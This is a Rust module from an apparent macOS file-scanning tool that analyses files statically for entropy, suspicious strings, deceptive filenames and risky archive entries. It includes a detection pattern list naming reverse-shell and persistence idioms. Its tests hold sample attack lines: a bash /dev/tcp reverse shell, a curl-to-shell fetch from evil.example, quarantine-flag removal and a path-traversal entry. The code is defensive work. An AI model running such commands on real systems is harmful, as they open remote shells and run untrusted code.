//! Tasks 1.6-1.8 — static-only content analysis: entropy, suspicious
//! string scanning, filename obfuscation, archive pre-inspection, hashing.
//!
//! **Hard invariant:** nothing in this module ever executes, opens, or
//! invokes the file under analysis. Every check reads bytes, metadata, or
//! structure only.

use crate::file_type_risk::HIGH_RISK_EXTENSIONS;
use sha2::{Digest, Sha256};
use std::io::Read;
use std::path::Path;

/// Cap, per end of the file, on how much gets read into memory for
/// entropy/string analysis — these are heuristic checks, not exact-match
/// ones, so sampling is an accepted tradeoff (common practice in static AV
/// engines). Hashing (below) is exact and streams the full file
/// regardless of size.
const MAX_STATIC_SCAN_BYTES: usize = 25 * 1024 * 1024;

/// Reads up to `MAX_STATIC_SCAN_BYTES` from **both ends** of a file large
/// enough to need it, not just the head. A head-only cap is a known
/// evasion target: pad a file with junk so the real payload sits past
/// whatever a scanner's size limit is. Sampling both ends doesn't defeat
/// padding placed in the *middle* of a huge file, but it closes the
/// simpler, more common head-only version of the trick at negligible
/// extra cost. Small files (at or under twice the cap) are just read in
/// full.
pub fn read_capped(path: &Path) -> std::io::Result<Vec<u8>> {
    let mut f = std::fs::File::open(path)?;
    let len = f.metadata()?.len();

    if len <= (MAX_STATIC_SCAN_BYTES as u64) * 2 {
        let mut buf = Vec::new();
        f.read_to_end(&mut buf)?;
        return Ok(buf);
    }

    let mut head = vec![0u8; MAX_STATIC_SCAN_BYTES];
    f.read_exact(&mut head)?;

    use std::io::{Seek, SeekFrom};
    f.seek(SeekFrom::End(-(MAX_STATIC_SCAN_BYTES as i64)))?;
    let mut tail = vec![0u8; MAX_STATIC_SCAN_BYTES];
    f.read_exact(&mut tail)?;

    head.extend_from_slice(&tail);
    Ok(head)
}

/// Full-file SHA-256, streamed in fixed-size chunks so memory use stays
/// bounded regardless of file size. Not a detection signal on its own yet
/// (no local known-bad-hash list exists) — report/provenance metadata,
/// and the connective tissue for any hash-reputation service added later.
pub fn sha256_of_file(path: &Path) -> std::io::Result<String> {
    let mut f = std::fs::File::open(path)?;
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 65536];
    loop {
        let n = f.read(&mut buf)?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

/// Shannon entropy in bits/byte. Only meaningful as a signal when checked
/// against already-high-risk-tier files (see `file_type_risk.rs`) —
/// legitimately compressed archives/installers are high-entropy too, so
/// entropy alone, on its own, is not treated as a trigger condition here.
pub fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Threshold above which entropy is treated as "looks packed/encrypted".
pub const HIGH_ENTROPY_THRESHOLD: f64 = 7.5;

const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
    ("| bash", "pipe-to-shell execution idiom"),
    ("| sh", "pipe-to-shell execution idiom"),
    (
        "osascript",
        "AppleScript invocation embedded in a binary/script",
    ),
    (
        "do shell script",
        "AppleScript's shell-execution primitive — often paired with a privilege-escalation prompt",
    ),
    (
        "with administrator privileges",
        "AppleScript privilege-escalation request",
    ),
    (
        "LaunchDaemons",
        "references a system-wide persistence location",
    ),
    ("LaunchAgents", "references a user persistence location"),
    ("launchctl load", "loads a persistence job directly"),
    ("crontab -", "installs a cron-based persistence job"),
    (
        "AXIsProcessTrusted",
        "checks Accessibility permission — associated with keylogging/UI automation abuse",
    ),
    (
        "CGEventTapCreate",
        "raw input capture API — associated with keyloggers",
    ),
    (
        "IOHIDManagerCreate",
        "raw HID input capture API — associated with keyloggers",
    ),
    ("/etc/passwd", "reads the system credential file location"),
    (
        "Security.framework",
        "links against the system credential/keychain framework",
    ),
    (
        "com.apple.quarantine",
        "references the quarantine attribute by name — a legitimate file has no reason to \
         inspect or strip its own quarantine flag, or another file's",
    ),
    (
        "csrutil disable",
        "attempts to disable System Integrity Protection",
    ),
    (
        "tccutil reset",
        "resets macOS privacy/permission grants — a known evasion/attack step",
    ),
    (
        "chflags hidden",
        "hides a file from Finder via the legacy hidden flag",
    ),
    (
        "SetFile -a V",
        "hides a file via the legacy invisible attribute",
    ),
    (
        "base64 -D",
        "decodes a base64 blob, often paired with piping the result to a shell",
    ),
    (
        "base64 --decode",
        "decodes a base64 blob, often paired with piping the result to a shell",
    ),
    (
        "/dev/tcp/",
        "bash's raw TCP socket idiom — a common reverse-shell technique",
    ),
    ("nc -e", "netcat reverse/bind-shell idiom"),
];

/// Extracts printable-ASCII runs (mirroring the Unix `strings` command)
/// and checks them against a small curated set of suspicious patterns — a
/// lightweight stand-in for full YARA rule matching, which would need the
/// system YARA C library as an install-time dependency.
pub fn scan_suspicious_strings(bytes: &[u8]) -> Vec<String> {
    let extracted = extract_printable_strings(bytes, 4);
    SUSPICIOUS_PATTERNS
        .iter()
        .filter(|(pattern, _)| extracted.iter().any(|s| s.contains(pattern)))
        .map(|(pattern, description)| format!("{pattern} — {description}"))
        .collect()
}

fn extract_printable_strings(bytes: &[u8], min_len: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    for &b in bytes {
        if b.is_ascii_graphic() || b == b' ' {
            current.push(b as char);
        } else if current.len() >= min_len {
            out.push(std::mem::take(&mut current));
        } else {
            current.clear();
        }
    }
    if current.len() >= min_len {
        out.push(current);
    }
    out
}

const BIDI_OVERRIDE_CHARS: &[char] = &[
    '\u{202A}', '\u{202B}', '\u{202C}', '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}',
    '\u{2069}',
];

const BAIT_EXTENSIONS: &[&str] = &[
    "pdf", "doc", "docx", "jpg", "jpeg", "png", "txt", "xls", "xlsx", "mp3", "mp4",
];

/// Two classic filename-based social-engineering tricks that content
/// analysis alone doesn't cover, because they're about what the user
/// *sees*, not the file's bytes:
/// - Unicode bidi-override characters (e.g. U+202E) that visually reverse
///   part of the filename, making a real `.exe` display as `.pdf`.
/// - Double extensions (`invoice.pdf.app`) where the bait extension is
///   what's visible and the real one trails it.
pub fn detect_filename_obfuscation(filename: &str) -> Option<String> {
    if filename.chars().any(|c| BIDI_OVERRIDE_CHARS.contains(&c)) {
        return Some(
            "filename contains a Unicode bidi-override character — a known trick for reversing \
             displayed characters to hide the real extension"
                .to_string(),
        );
    }

    let parts: Vec<&str> = filename.split('.').collect();
    if parts.len() >= 3 {
        let inner_ext = parts[parts.len() - 2].to_lowercase();
        let outer_ext = parts[parts.len() - 1].to_lowercase();
        if BAIT_EXTENSIONS.contains(&inner_ext.as_str()) && inner_ext != outer_ext {
            return Some(format!(
                "double extension: looks like a .{inner_ext} file but the real extension is .{outer_ext}"
            ));
        }
    }

    None
}

/// Shared by every archive inspector below: flags path-traversal entry
/// names (the "Zip Slip" pattern, not zip-specific despite the name) and
/// high-risk file types nested inside. Checks every path *component's*
/// own extension, not just the whole entry name's trailing dot — a bundle
/// like `Foo.app/Contents/MacOS/Foo` has `.app` on an intermediate
/// directory component, not as the final segment's extension.
fn check_archive_entry_name(name: &str) -> Option<String> {
    if name.contains("../") {
        return Some(format!("archive entry uses path traversal: {name}"));
    }
    for component in name.split('/') {
        if let Some(ext) = component.rsplit('.').next()
            && ext != component // component must actually contain a dot
            && HIGH_RISK_EXTENSIONS.contains(&ext.to_lowercase().as_str())
        {
            return Some(format!("archive contains a high-risk entry: {name}"));
        }
    }
    None
}

/// Reads a zip's central directory listing only — no extraction to disk.
pub fn inspect_zip_archive(path: &Path) -> Option<String> {
    let file = std::fs::File::open(path).ok()?;
    let mut archive = zip::ZipArchive::new(file).ok()?;
    for i in 0..archive.len() {
        let entry = archive.by_index(i).ok()?;
        if let Some(finding) = check_archive_entry_name(entry.name()) {
            return Some(finding);
        }
    }
    None
}

/// Reads a tar (or gzip-compressed tar) archive's entry headers only —
/// `tar::Archive::entries()` reads headers sequentially without writing
/// any entry's content to disk.
pub fn inspect_tar_archive(path: &Path, gzip_compressed: bool) -> Option<String> {
    let file = std::fs::File::open(path).ok()?;
    if gzip_compressed {
        let decoder = flate2::read::GzDecoder::new(file);
        inspect_tar_entries(tar::Archive::new(decoder))
    } else {
        inspect_tar_entries(tar::Archive::new(file))
    }
}

fn inspect_tar_entries<R: Read>(mut archive: tar::Archive<R>) -> Option<String> {
    let entries = archive.entries().ok()?;
    for entry in entries {
        let entry = entry.ok()?;
        let path = entry.path().ok()?;
        let name = path.to_string_lossy().to_string();
        if let Some(finding) = check_archive_entry_name(&name) {
            return Some(finding);
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write as _;

    fn build_test_zip(path: &Path, entries: &[(&str, &[u8])]) {
        let file = std::fs::File::create(path).unwrap();
        let mut writer = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::default();
        for (name, content) in entries {
            writer.start_file(*name, options).unwrap();
            writer.write_all(content).unwrap();
        }
        writer.finish().unwrap();
    }

    fn build_test_tar(path: &Path, entries: &[(&str, &[u8])], gzip: bool) {
        let file = std::fs::File::create(path).unwrap();
        if gzip {
            let encoder = flate2::write::GzEncoder::new(file, flate2::Compression::default());
            let mut builder = tar::Builder::new(encoder);
            for (name, content) in entries {
                let mut header = tar::Header::new_gnu();
                header.set_size(content.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append_data(&mut header, name, *content).unwrap();
            }
            builder.into_inner().unwrap().finish().unwrap();
        } else {
            let mut builder = tar::Builder::new(file);
            for (name, content) in entries {
                let mut header = tar::Header::new_gnu();
                header.set_size(content.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append_data(&mut header, name, *content).unwrap();
            }
            builder.finish().unwrap();
        }
    }

    #[test]
    fn tar_inspection_catches_app_bundle_nested_inside_a_tar() {
        let path = std::env::temp_dir().join("insula-test-archive.tar");
        build_test_tar(
            &path,
            &[
                ("Payload.app/Contents/MacOS/Payload", b"fake binary content"),
                ("readme.txt", b"just a normal readme"),
            ],
            false,
        );
        let result = inspect_tar_archive(&path, false);
        assert!(result.is_some());
        assert!(result.unwrap().contains(".app"));
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn tar_gz_inspection_works_through_gzip_compression() {
        let path = std::env::temp_dir().join("insula-test-archive.tar.gz");
        build_test_tar(&path, &[("installer.pkg", b"fake pkg content")], true);
        let result = inspect_tar_archive(&path, true);
        assert!(result.is_some());
        assert!(result.unwrap().contains(".pkg"));
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn tar_inspection_is_clean_for_ordinary_files() {
        let path = std::env::temp_dir().join("insula-test-clean.tar");
        build_test_tar(&path, &[("notes.txt", b"just notes")], false);
        let result = inspect_tar_archive(&path, false);
        assert!(result.is_none());
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn suspicious_string_scan_catches_self_quarantine_removal() {
        let content = b"xattr -d com.apple.quarantine \"$0\"";
        let found = scan_suspicious_strings(content);
        assert!(found.iter().any(|f| f.contains("com.apple.quarantine")));
    }

    #[test]
    fn suspicious_string_scan_catches_reverse_shell_idiom() {
        let content = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let found = scan_suspicious_strings(content);
        assert!(found.iter().any(|f| f.contains("/dev/tcp/")));
    }

    #[test]
    fn archive_inspection_catches_app_bundle_nested_inside_a_zip() {
        let path = std::env::temp_dir().join("insula-test-photos.zip");
        build_test_zip(
            &path,
            &[
                (
                    "InnocentLookingApp.app/Contents/MacOS/InnocentLookingApp",
                    b"fake binary content",
                ),
                ("readme.txt", b"just a normal readme"),
            ],
        );
        let result = inspect_zip_archive(&path);
        assert!(
            result.is_some(),
            "should catch the .app bundle nested inside the zip"
        );
        assert!(result.unwrap().contains(".app"));
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn archive_inspection_is_clean_for_ordinary_files() {
        let path = std::env::temp_dir().join("insula-test-clean.zip");
        build_test_zip(
            &path,
            &[("photo1.jpg", b"fake jpeg"), ("photo2.jpg", b"fake jpeg")],
        );
        let result = inspect_zip_archive(&path);
        assert!(result.is_none());
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn archive_inspection_catches_path_traversal() {
        let path = std::env::temp_dir().join("insula-test-slip.zip");
        build_test_zip(&path, &[("../../etc/cron.d/evil", b"x")]);
        let result = inspect_zip_archive(&path);
        assert!(result.is_some());
        assert!(result.unwrap().contains("path traversal"));
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn entropy_of_uniform_zero_bytes_is_zero() {
        let bytes = vec![0u8; 1024];
        assert_eq!(shannon_entropy(&bytes), 0.0);
    }

    #[test]
    fn entropy_of_random_looking_bytes_is_high() {
        let bytes: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(shannon_entropy(&bytes) > 7.9);
    }

    #[test]
    fn suspicious_string_scan_finds_shell_pipe_idiom() {
        let content = b"#!/bin/sh\ncurl http://evil.example | sh\n";
        let found = scan_suspicious_strings(content);
        assert!(found.iter().any(|f| f.contains("| sh")));
    }

    #[test]
    fn suspicious_string_scan_is_empty_for_plain_text() {
        let content = b"just a normal document with nothing unusual in it";
        assert!(scan_suspicious_strings(content).is_empty());
    }

    #[test]
    fn rtl_override_character_is_detected() {
        let filename = "invoice\u{202E}fdp.exe";
        let result = detect_filename_obfuscation(filename);
        assert!(result.is_some());
        assert!(result.unwrap().contains("bidi-override"));
    }

    #[test]
    fn double_extension_is_detected() {
        let result = detect_filename_obfuscation("invoice.pdf.app");
        assert!(result.is_some());
        assert!(result.unwrap().contains("double extension"));
    }

    #[test]
    fn normal_filename_is_not_flagged() {
        assert!(detect_filename_obfuscation("invoice.pdf").is_none());
        assert!(detect_filename_obfuscation("archive.tar.gz").is_none());
    }

    #[test]
    fn sha256_is_deterministic() {
        let path = std::env::temp_dir().join("insula-test-hash.txt");
        std::fs::write(&path, b"insula test content").unwrap();
        let h1 = sha256_of_file(&path).unwrap();
        let h2 = sha256_of_file(&path).unwrap();
        assert_eq!(h1, h2);
        assert_eq!(h1.len(), 64);
        std::fs::remove_file(path).ok();
    }
}
